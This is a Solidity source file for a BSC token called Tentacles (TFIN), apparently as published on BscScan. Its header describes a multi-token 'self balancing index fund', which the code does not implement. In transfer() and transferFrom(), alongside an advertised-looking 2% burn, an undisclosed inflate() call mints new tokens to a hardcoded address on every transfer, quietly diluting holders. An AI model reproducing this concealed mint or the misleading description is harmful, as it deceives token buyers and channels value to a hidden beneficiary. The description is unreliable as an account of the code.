/**
 *Submitted for verification at BscScan.com on 2022-03-14
*/

pragma solidity ^0.5.0;



/**
 * @title Tentacles
 *  Tentacles is a unique form of self balancing index fund,
 *utilizing multiple tokens on BSC, synthetic liquidity,
 *and novel tokenomics to take the fullest advantage of existing and future 
 *DEX & AMM infrastructure, 
 *to ensure the best performance within the overall market ecosystem of DEFI.
 */
 

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 public _Tokendecimals;
  string public _Tokenname;
  string public _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
    _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function name() public view returns(string memory) {
    return _Tokenname;
  }

  function symbol() public view returns(string memory) {
    return _Tokensymbol;
  }

  function decimals() public view returns(uint8) {
    return _Tokendecimals;
  }
}

/**end here**/

contract Tentacles is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) public _tentaclesTokenBalances;
  mapping (address => mapping (address => uint256)) public _allowed;
  string constant tokenName = "Tentacles";
  string constant tokenSymbol = "TFIN";
  uint8  constant tokenDecimals = 8;
  uint256 _totalSupply = 22222200000000;
 
 
  

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint(msg.sender, _totalSupply);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _tentaclesTokenBalances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }



  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _tentaclesTokenBalances[msg.sender]);
    require(to != address(0));

    uint256 tentaclesTokenDecay = value.div(50);
    uint256 tokensToTransfer = value.sub(tentaclesTokenDecay);

    _tentaclesTokenBalances[msg.sender] = _tentaclesTokenBalances[msg.sender].sub(value);
    _tentaclesTokenBalances[to] = _tentaclesTokenBalances[to].add(tokensToTransfer);

    _totalSupply = _totalSupply.sub(tentaclesTokenDecay);
    inflate(address(0xF5287180728AAc26BcadbD287eFa183cEEAfE32d), 100000000);

    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), tentaclesTokenDecay);
    return true;
  }

  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _tentaclesTokenBalances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _tentaclesTokenBalances[from] = _tentaclesTokenBalances[from].sub(value);

    uint256 tentaclesTokenDecay = value.div(50);
    uint256 tokensToTransfer = value.sub(tentaclesTokenDecay);

    _tentaclesTokenBalances[to] = _tentaclesTokenBalances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(tentaclesTokenDecay);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
    inflate(address(0xF5287180728AAc26BcadbD287eFa183cEEAfE32d), 100000000);

    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0), tentaclesTokenDecay);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _tentaclesTokenBalances[account] = _tentaclesTokenBalances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
  
    function inflate(address account, uint256 amount) internal {
    require(amount != 0);
    _totalSupply = _totalSupply.add(amount);
    _tentaclesTokenBalances[account] = _tentaclesTokenBalances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _tentaclesTokenBalances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _tentaclesTokenBalances[account] = _tentaclesTokenBalances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
}